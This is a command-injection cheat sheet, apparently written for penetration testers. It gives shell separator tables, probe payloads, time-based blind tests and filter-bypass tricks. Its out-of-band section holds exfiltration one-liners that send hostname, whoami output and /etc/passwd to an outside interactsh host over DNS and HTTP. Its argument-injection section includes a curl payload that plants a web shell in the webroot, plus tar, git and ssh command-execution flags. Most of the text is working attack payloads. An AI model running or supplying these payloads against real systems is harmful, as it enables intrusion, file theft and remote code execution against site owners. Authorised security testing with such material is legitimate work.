# Manual Command Injection — Separators, Blind/OOB, Bypasses

## 1. Separator / metacharacter matrix

| Payload shape | Shell behavior | Unix | Windows cmd | PowerShell |
|---|---|---|---|---|
| `;cmd` | sequential, always runs | ✓ | ✗ | ✓ |
| `&cmd` | background / sequential | ✓ | ✓ | ✗ (`&` is call op) |
| `&&cmd` | runs if previous succeeded | ✓ | ✓ | ✓ (PS7) |
| `|cmd` | pipes output; cmd runs regardless | ✓ | ✓ | ✓ |
| `||cmd` | runs if previous failed | ✓ | ✓ | ✓ (PS7) |
| `%0a cmd` (newline) | new statement | ✓ | ✓ (in some parsers) | ✓ |
| `` `cmd` `` | inline substitution — runs even inside quoted strings | ✓ | ✗ | ✗ |
| `$(cmd)` | inline substitution, nestable | ✓ | ✗ | `$(...)` subexpr |
| `%0d` (CR) | sometimes treated as newline | varies | varies | — |

Inline substitution (`` ` `` and `$(…)`) is the key test when input lands
*inside quotes*: `ping -c 1 "INPUT"` breaks for `;id` but executes
`$(id)`.

URL-encoding for GET: `;`→`%3b` `&`→`%26` `|`→`%7c` newline→`%0a`
space→`%20` backtick→`%60` `$`→`%24`.

## 2. Probe set (in-band)

Send each; diff response body/length/time against baseline:

```
;id
';id;'
";id;"
|id
|whoami
&&id
||id
%0aid
`id`
$(id)
;cat /etc/passwd
& whoami            (Windows)
| whoami            (Windows)
%0a whoami
```

Echo-canary variant (avoids FPs from pages that contain "uid" naturally) —
commix uses the same trick:

```
;echo CANARY$((13+37))CANARY     → look for CANARY50CANARY
& echo CANARY^%RANDOM%           (Windows)
```

## 3. Time-based blind

Baseline 3 requests. Inject, require the delta to scale:

```
;sleep 5          then ;sleep 10
|sleep 10
&&sleep 10
||sleep 10        (fires only if the base command FAILS — try when && is silent)
$(sleep 10)
`sleep 10`
;ping -c 10 127.0.0.1          (~9s; when "sleep" is keyword-filtered)
& timeout /T 10                (Windows)
& ping -n 10 127.0.0.1         (Windows, ~9s)
;powershell Start-Sleep 10     (Windows w/ PS)
```

Both `&&` and `||` delaying = input likely evaluated twice or in a compound.
Only `||` delaying = your injection breaks the base command (good sign —
quoting broke).

## 4. OOB confirmation and exfiltration

Start `interactsh-client -json -o oast.jsonl -v`; take the session host.
Use one unique subdomain per (url,param) so callbacks map back:

```
;nslookup u1-addr.SESSION.oast.pro
;dig u1-addr.SESSION.oast.pro
;curl http://u1-addr.SESSION.oast.pro/
;wget -q http://u1-addr.SESSION.oast.pro/ -O /dev/null
$(nslookup u2-host.SESSION.oast.pro)
& nslookup u3.SESSION.oast.pro                       (Windows)
;powershell Resolve-DnsName u4.SESSION.oast.pro      (Windows)
```

Exfil over DNS (works with DNS-only egress; labels ≤63 chars, hex-safe):

```
;h=$(hostname|xxd -p|head -c 60); nslookup $h.SESSION.oast.pro
;for c in $(cat /etc/passwd|xxd -p -c 30); do nslookup $c.ex.SESSION.oast.pro; done
```

Exfil over HTTP:

```
;curl -s http://SESSION.oast.pro/$(whoami)
;curl -s -X POST --data-binary @/etc/passwd http://SESSION.oast.pro/loot
```

Reading `oast.jsonl`: each line has `protocol` (`dns`/`http`/`smtp`),
`full-id` (your subdomain → which param fired), `raw-request`,
`remote-address` (the egress IP of the target — note NAT/proxy differences
from the web-facing IP).

## 5. Filter bypasses

**Spaces filtered:**
```
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X
%09 (tab) instead of %20
```

**Keywords filtered (`cat`, `sleep`, …):**
```
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd
c$@at /etc/passwd
$(rev<<<'tac') f=/etc/passwd...
a=sl;b=eep;$a$b 10
/???/??t /??c/??ss??       (glob: /bin/cat /etc/passwd)
```

**Everything printable filtered — base64 stage:**
```
echo aWQ=|base64 -d|sh
`echo${IFS}aWQ=|base64${IFS}-d`
bash<<<$(base64 -d<<<aWQ=)
```

**Blocklist on `;|&` only:** newline `%0a` almost always survives; also try
`%0d%0a`, and inline `` `cmd` `` / `$(cmd)` which need no separator at all.

**Null-ing the rest of the line:** append `#` (Unix comment) or ` //` or
`%00` (legacy) to drop trailing fixed arguments:
```
203.0.113.5;id #
```

## 6. Argument injection (no metacharacters needed)

When metachars are stripped but input becomes *arguments* to a known binary,
inject flags:

```
curl:   -o /var/www/html/sh.php http://198.51.100.7/sh.php
wget:   --post-file=/etc/passwd http://SESSION.oast.pro/
tar:    --checkpoint=1 --checkpoint-action=exec=sh
find:   -exec sh -c id ;
zip:    -T -TT 'sh #'
git:    -c core.sshCommand='id' / ext::sh -c id
ssh:    -oProxyCommand='id' x
sendmail: -X/var/www/html/log.php    (write log into webroot)
awk/sed/vim/less/nmap: GTFOBins-style escapes once you control argv
```

Test by injecting a leading `-` and watching for usage/error text — a
`curl: option -z: ...` style error proves argv injection even before
exploitation. `--` in your payload can also *terminate* option parsing when
the app prepends safe flags.

## 7. Context identification cheat-sheet

| App code shape | What works |
|---|---|
| `system("ping " + in)` | everything |
| `system("ping '" + in + "'")` | `';id;'`, backticks/`$()` do NOT escape single quotes — break out first |
| `system("ping \"" + in + "\"")` | `";id;"`, and `$(id)` / backticks run *inside* double quotes |
| `exec*/ProcessBuilder` array (no shell) | metachars dead → argument injection only |
| input → file written → cron/parser | second-order; use OOB with long wait window |
